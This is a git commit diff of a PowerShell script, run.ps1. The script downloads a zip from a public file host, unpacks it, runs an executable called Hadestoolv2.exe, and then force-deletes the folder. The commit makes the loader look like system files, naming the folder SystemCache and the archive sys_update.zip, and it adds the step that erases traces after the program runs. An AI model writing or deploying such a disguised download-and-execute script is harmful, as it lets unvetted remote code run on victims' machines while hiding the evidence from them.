d189f6e50ec2a9694d885b211eb3511761f2f856
natchanam18-debug <natchanam18@gmail.com>
2026-07-31 00:10:07 +0700

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,11 +1,13 @@
-$folder = "$env:APPDATA\Microsoft\Windows\Hadestoolv2"
+$folder = "$env:SystemRoot\Temp\SystemCache"
 if (!(Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }
 
 $zipUrl = "https://files.catbox.moe/zvd84i.zip"
-$zipPath = "$env:TEMP\app.zip"
+$zipPath = "$env:TEMP\sys_update.zip"
 
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
 Expand-Archive -Path $zipPath -DestinationPath $folder -Force
 Remove-Item $zipPath -ErrorAction SilentlyContinue
 
-Start-Process "$folder\Hadestoolv2.exe"
+# รันโปรแกรมและรอให้ปิดตัวลง จากนั้นสั่งลบโฟลเดอร์ทิ้งทันที
+Start-Process -FilePath "$folder\Hadestoolv2.exe" -Wait
+Remove-Item $folder -Recurse -Force -ErrorAction SilentlyContinue
